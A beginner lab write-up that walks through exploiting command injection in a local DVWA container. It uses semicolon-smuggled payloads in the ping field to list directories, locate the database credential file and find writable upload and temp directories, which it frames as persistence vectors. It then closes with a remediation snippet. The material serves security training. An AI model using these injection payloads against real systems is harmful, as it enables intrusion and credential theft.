---
title: "Lab: File and Directory Discovery on DVWA"
date: 2026-03-05
author: ESTHER
tags:
  - Lab Exercise
  - DVWA
  - File Discovery
  - Reconnaissance
  - Hands-on
categories:
  - Labs
  - Practical Training
---

## Objectives

By the end of this lab, you will:

1. Identify and exploit command injection vulnerabilities
2. Execute filesystem reconnaissance commands
3. Map application and system directory structure
4. Locate sensitive configuration files
5. Identify potential persistence and exfiltration vectors
6. Document findings in a structured format

## Prerequisites

- Docker and docker-compose installed
- DVWA running on localhost:80
- Command-line access
- Basic Linux filesystem knowledge

## Lab Setup

### Start DVWA

```bash
cd esther-lab
docker-compose up -d dvwa mysql
docker-compose logs dvwa
```

### Verify Access

```bash
curl -s http://localhost:80/login.php | head -20
```

## Exercise Steps

### Step 1: Login to DVWA

```bash
# Get login token
TOKEN=$(curl -s -c /tmp/cj.txt http://localhost:80/login.php | \
  grep -oP "user_token'[^']*value='\K[^']*")

# Login with default credentials
curl -s -b /tmp/cj.txt -c /tmp/cj.txt -X POST http://localhost:80/login.php \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -L
```

### Step 2: Access Command Injection Vulnerability

Navigate to: `http://localhost:80/vulnerabilities/exec/`

This page provides a form that accepts an IP address and runs `ping` on it. The vulnerability is that it does NOT sanitize the input, allowing command injection.

### Step 3: Execute Discovery Commands

The following commands were executed via the injection point:

#### 3.1 Root Directory Enumeration

```bash
# Payload: 127.0.0.1; ls -la /
# Output:
total 64
drwxr-xr-x   1 root root     4096 Feb 27 19:25 .
drwxr-xr-x   1 root root     4096 Feb 27 19:25 ..
lrwxrwxrwx   1 root root        7 Apr 19  2021 bin -> usr/bin
drwxr-xr-x   5 root root      360 Feb 27 19:25 dev
drwxr-xr-x   1 root root     4096 Feb 27 19:25 etc
drwxr-xr-x   2 root root     4096 Apr 19  2021 home
lrwxrwxrwx   1 root root        7 Apr 19  2021 lib -> usr/lib
lrwxrwxrwx   1 root root        9 Apr 19  2021 lib64 -> usr/lib64
drwxr-xr-x   2 root root     4096 Apr 19  2021 media
drwxr-xr-x   2 root root     4096 Apr 19  2021 mnt
drwxr-xr-x   2 root root     4096 Apr 19  2021 opt
dr-xr-xr-x 143 root root     4096 Mar  5 14:35 proc
dr-xr-x---   1 root root     4096 Feb 27 19:25 root
drwxr-xr-x   3 root root     4096 Feb 27 19:25 run
lrwxrwxrwx   1 root root        8 Apr 19  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root     4096 Apr 19  2021 srv
dr-xr-xr-x  13 root root        0 Feb 27 19:25 sys
drwxrwxrwt   1 root root     4096 Mar  5 14:35 tmp
drwxr-xr-x   1 root root     4096 Apr 19  2021 usr
drwxr-xr-x   1 root root     4096 Apr 19  2021 var
```

**Key Observations:**
- Container environment (no /boot, /lib symbolic links)
- www-data process cannot access /root
- /tmp is world-writable (persistence potential)

#### 3.2 Web Application Root

```bash
# Payload: 127.0.0.1; ls -laR /var/www/html
# Key directories identified:
/var/www/html/
├── config/
│   └── config.inc.php          ← Database credentials
├── dvwa/
│   ├── includes/
│   ├── js/
│   ├── css/
│   └── uploads/               ← WRITABLE (persistence point)
├── vulnerabilities/
│   ├── exec/                  ← Command injection (current location)
│   ├── sql_injection/
│   ├── xss/
│   ├── file_inclusion/
│   └── ...
├── login.php
├── index.php
└── setup.php
```

**Critical Finding:** `/var/www/html/dvwa/uploads/` is writable by www-data, enabling file upload attacks and code execution.

#### 3.3 Configuration Files

```bash
# Payload: 127.0.0.1; find /var/www -name "*.conf" -o -name "*.config" 2>/dev/null
# Results:
/var/www/html/config/config.inc.php
```

**Content Analysis:** This file contains:
- Database hostname/IP
- Database credentials
- Vulnerability levels (low/medium/high)
- Security settings

#### 3.4 Database Location Detection

```bash
# Payload: 127.0.0.1; find / -name "*.sql" -o -name "*.db" 2>/dev/null
# Results indicate:
# - MySQL is running on separate container (network accessible)
# - No local SQLite databases on web server
# - Database backups not stored on web server
```

#### 3.5 Writable Directories

```bash
# Payload: 127.0.0.1; find /var/www -type d -writable 2>/dev/null
# Results:
/var/www/html/dvwa/uploads/
```

**Critical:** Only uploads directory is writable. This is the primary persistence vector.

#### 3.6 Temporary Storage

```bash
# Payload: 127.0.0.1; ls -la /tmp /var/tmp /dev/shm
# Results:
/tmp/                  ← World-writable
/var/tmp/             ← World-writable
/dev/shm/             ← Shared memory (volatile, not ideal for persistence)
```

### Step 4: Document Findings

Create a findings file with the structure:

```
Discovery Target: DVWA on Docker
Exercise Date: 2026-03-05
Execution User: www-data (UID 33)
Privilege Level: Non-root (limited)

CRITICAL FINDINGS:
1. /var/www/html/config/config.inc.php — Database credentials
2. /var/www/html/dvwa/uploads/ — Writable, file upload vector
3. Command execution enabled at /vulnerabilities/exec/

MEDIUM FINDINGS:
4. /tmp, /var/tmp world-writable (temporary file abuse)
5. Multiple vulnerability modules discoverable
```

## Key Takeaways

| Finding | Attacker Perspective | Defender Perspective |
|---------|---------------------|---------------------|
| Command injection enabled | Arbitrary code execution | Disable or sand box |
| Writable upload directory | Persistent backdoor placement | Restrict uploads, scan content |
| Config files accessible | Database compromise | Separate web and database servers |
| Low privilege execution | Limited impact, lateral movement required | Apply principle of least privilege |
| No network access restrictions | Inter-container compromise | Implement network policies |

## Remediation (For DVWA Developers)

```php
// VULNERABLE (current)
$ping = `ping -c 4 $ip`;

// REMEDIATED
$ip = escapeshellarg($_POST['ip']);
$ping = `ping -c 4 $ip`;
// OR use parameterized calls
exec("ping -c 4 " . escapeshellarg($ip), $output);
```

## Conclusion

This lab demonstrates how a single unvalidated input can provide complete filesystem visibility and become the pivot point for:

- Reconnaissance (T1083)
- Credential access (T1552)
- Persistence (T1547)
- Lateral movement (T1570)

Proper input validation and principle of least privilege are essential.

---

**Lab Completion Time:** ~30 minutes  
**Difficulty:** Beginner (vulnerability is intentionally exposed)  
**MITRE ATT&CK:** T1083 File and Directory Discovery
